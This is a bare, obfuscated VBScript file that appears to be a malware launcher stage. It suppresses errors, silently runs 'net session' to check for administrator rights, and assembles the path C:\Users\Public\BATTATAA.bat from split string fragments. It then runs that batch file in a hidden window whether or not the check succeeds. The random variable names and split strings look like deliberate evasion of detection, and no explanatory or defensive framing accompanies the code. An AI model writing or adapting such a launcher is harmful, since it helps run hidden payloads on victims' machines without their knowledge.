On Error Resume Next
Dim OKHZQSXZESFYDVAT
Dim EDBZSWZIOYANLLXY
Dim AARKWCAJPRMORVMD
EDBZSWZIOYANLLXY = False
AARKWCAJPRMORVMD = 0
Set OKHZQSXZESFYDVAT = CreateObject("WScript.Shell")
Dim ARRIFAEZFUIYTHOX
ARRIFAEZFUIYTHOX = "net session"
AARKWCAJPRMORVMD = OKHZQSXZESFYDVAT.Run(ARRIFAEZFUIYTHOX, 0, True)
If AARKWCAJPRMORVMD = 0 Then
EDBZSWZIOYANLLXY = True
End If
Dim JPPEIHPPYKYFWWHP
JPPEIHPPYKYFWWHP = "C:\Use"
Dim KOFEMPIKBLYQPCWA
KOFEMPIKBLYQPCWA = "rs\Pub"
Dim MXCAOZPTWSJNICWH
MXCAOZPTWSJNICWH = "lic\BATTATAA.b"
Dim KKTWUVNDHLRRJFYE
KKTWUVNDHLRRJFYE = JPPEIHPPYKYFWWHP + KOFEMPIKBLYQPCWA + MXCAOZPTWSJNICWH + "at"

If EDBZSWZIOYANLLXY Then
OKHZQSXZESFYDVAT.Run KKTWUVNDHLRRJFYE, 0
Else
OKHZQSXZESFYDVAT.Run KKTWUVNDHLRRJFYE, 0
End If
On Error GoTo 0